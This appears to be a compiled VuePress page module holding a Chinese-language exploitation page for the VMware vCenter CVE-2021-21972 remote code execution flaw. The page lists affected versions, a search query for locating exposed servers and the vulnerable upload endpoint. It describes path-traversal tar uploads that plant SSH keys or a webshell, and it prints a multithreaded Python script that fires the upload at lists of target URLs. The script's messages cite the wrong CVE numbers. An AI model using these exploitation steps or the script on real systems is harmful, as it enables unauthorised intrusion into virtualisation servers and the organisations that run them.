import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"由于对 vSphere vCenter Server中用户提供的输入的验证不足，因此存在该漏洞。远程非身份验证攻击者可以向端口 443/tcp 发送专门制作的 HTTP 请求，并在系统上执行任意代码。",-1),d=n("p",null,"参考链接：",-1),k={href:"https://blog.noah.360.net/vcenter-6-5-7-0-rce-lou-dong-fen-xi/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://swarm.ptsecurity.com/unauth-rce-vmware/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.vmware.com/security/advisories/VMSA-2021-0002.html",target:"_blank",rel:"noopener noreferrer"},b=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>VMware vCenter Server 7.0系列 &lt; 7.0.U1c
VMware vCenter Server 6.7系列 &lt; 6.7.U3l
VMware vCenter Server 6.5系列 &lt; 6.5 U3n
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;vmware-vCenter&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>漏洞路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://target/ui/vropspluginui/rest/services/uploadova
POST: name=&quot;uploadFile&quot;; filename=&quot;xxx.tar&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>构造POST包上传tar文件：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/16142224147525.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Linux可以直接创建../../home/vsphere-ui/.ssh/authorized_keys TAR文件 后直接SSH连；Windows可以直接写入webshell。</p><p>批量检测脚本：</p>`,11),h={href:"https://raw.githubusercontent.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/main/CVE-2021-21972.py",target:"_blank",rel:"noopener noreferrer"},g=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#-*- coding:utf-8 -*-</span>
banner <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
        888888ba             dP                     
        88    \`8b            88                     
       a88aaaa8P&#39; .d8888b. d8888P .d8888b. dP    dP 
        88   \`8b. 88&#39;  \`88   88   Y8ooooo. 88    88 
        88    .88 88.  .88   88         88 88.  .88 
        88888888P \`88888P8   dP   \`88888P&#39; \`88888P&#39; 
   ooooooooooooooooooooooooooooooooooooooooooooooooooooo 
                @time:2021/02/25 CVE-2021-21972.py
                C0de by NebulabdSec - @batsu                  
 &quot;&quot;&quot;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span>

<span class="token keyword">import</span> threadpool
<span class="token keyword">import</span> random
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> http<span class="token punctuation">.</span>client
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests


urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>
http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">.</span>_http_vsn <span class="token operator">=</span> <span class="token number">10</span>
http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">.</span>_http_vsn_str <span class="token operator">=</span> <span class="token string">&#39;HTTP/1.0&#39;</span>

TARGET_URI <span class="token operator">=</span> <span class="token string">&quot;/ui/vropspluginui/rest/services/uploadova&quot;</span>
<span class="token keyword">def</span> <span class="token function">get_ua</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    first_num <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span>
    third_num <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3200</span><span class="token punctuation">)</span>
    fourth_num <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">)</span>
    os_type <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">&#39;(Windows NT 6.1; WOW64)&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;(Windows NT 10.0; WOW64)&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;(X11; Linux x86_64)&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;(Macintosh; Intel Mac OS X 10_12_6)&#39;</span>
    <span class="token punctuation">]</span>
    chrome_version <span class="token operator">=</span> <span class="token string">&#39;Chrome/{}.0.{}.{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>first_num<span class="token punctuation">,</span> third_num<span class="token punctuation">,</span> fourth_num<span class="token punctuation">)</span>

    ua <span class="token operator">=</span> <span class="token string">&#39; &#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;Mozilla/5.0&#39;</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os_type<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;AppleWebKit/537.36&#39;</span><span class="token punctuation">,</span>
                   <span class="token string">&#39;(KHTML, like Gecko)&#39;</span><span class="token punctuation">,</span> chrome_version<span class="token punctuation">,</span> <span class="token string">&#39;Safari/537.36&#39;</span><span class="token punctuation">]</span>
                  <span class="token punctuation">)</span>
    <span class="token keyword">return</span> ua


<span class="token keyword">def</span> <span class="token function">CVE_2021_21972</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># proxies = {&quot;scoks5&quot;: &quot;http://127.0.0.1:1081&quot;}</span>
    proxies <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;http&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;http://127.0.0.1:8080&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;https&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;http://127.0.0.1:8080&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> get_ua<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token comment"># data = base64.b64decode(Payload)</span>
    <span class="token comment"># files = {&#39;uploadFile&#39;: open(&#39;all.tar&#39;, &#39;rb&#39;)} #linux</span>
    files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;uploadFile&#39;</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;test.tar&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token comment">#win</span>
    targetUrl <span class="token operator">=</span> url <span class="token operator">+</span> TARGET_URI
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>targetUrl<span class="token punctuation">,</span>
                            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
                            files<span class="token operator">=</span>files<span class="token punctuation">,</span>
                            verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                            proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
                            <span class="token comment"># proxies={&#39;socks5&#39;: &#39;http://127.0.0.1:1081&#39;})</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&quot;SUCCESS&quot;</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] URL:{}--------存在CVE-2021-21872漏洞&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token comment"># print(&quot;[+] Command success result: &quot; + res.text + &quot;\\n&quot;)</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;存在漏洞地址.txt&quot;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fw<span class="token punctuation">:</span>
                fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot; 没有发现CVE-2020-14882漏洞.\\n&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># except Exception as e:</span>
    <span class="token comment">#     print(e)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot; Request ERROR.\\n&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">multithreading</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> pools<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    works <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>
            func_params <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            <span class="token comment"># func_params = [i] + [cmd]</span>
            works<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>func_params<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    pool <span class="token operator">=</span> threadpool<span class="token punctuation">.</span>ThreadPool<span class="token punctuation">(</span>pools<span class="token punctuation">)</span>
    reqs <span class="token operator">=</span> threadpool<span class="token punctuation">.</span>makeRequests<span class="token punctuation">(</span>CVE_2021_21972<span class="token punctuation">,</span> works<span class="token punctuation">)</span>
    <span class="token punctuation">[</span>pool<span class="token punctuation">.</span>putRequest<span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token keyword">for</span> req <span class="token keyword">in</span> reqs<span class="token punctuation">]</span>
    pool<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span>
                        <span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Target URL; Example:http://ip:port&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-f&quot;</span><span class="token punctuation">,</span>
                        <span class="token string">&quot;--file&quot;</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Url File; Example:url.txt&quot;</span><span class="token punctuation">)</span>
    <span class="token comment"># parser.add_argument(&quot;-t&quot;,</span>
    <span class="token comment">#                     &quot;--tar&quot;,</span>
    <span class="token comment">#                     help=&quot;Create tar File; Example:test.tar&quot;)</span>
    <span class="token comment"># parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Commands to be executed; &quot;)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> args<span class="token punctuation">.</span>url
    <span class="token comment"># cmd = args.cmd</span>
    file_path <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token builtin">file</span>
    <span class="token comment"># jsp = args.tar</span>
    <span class="token comment"># if jsp != None:</span>
    <span class="token comment">#     print(jsp)</span>
    <span class="token comment">#     generate_zip(jsp)</span>
    <span class="token keyword">if</span> url <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> file_path <span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        CVE_2021_21972<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> url <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">and</span> file_path <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        multithreading<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># 默认15线程</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function _(q,f){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://blog.noah.360.net/vcenter-6-5-7-0-rce-lou-dong-fen-xi/"),t(a)])]),n("li",null,[n("a",v,[s("https://swarm.ptsecurity.com/unauth-rce-vmware/"),t(a)])]),n("li",null,[n("a",m,[s("https://www.vmware.com/security/advisories/VMSA-2021-0002.html"),t(a)])])]),b,n("ul",null,[n("li",null,[n("a",h,[s("https://raw.githubusercontent.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/main/CVE-2021-21972.py"),t(a)])])]),g])}const x=p(l,[["render",_],["__file","VMware vCenter Server 远程代码执行漏洞 CVE-2021-21972.html.vue"]]);export{x as default};
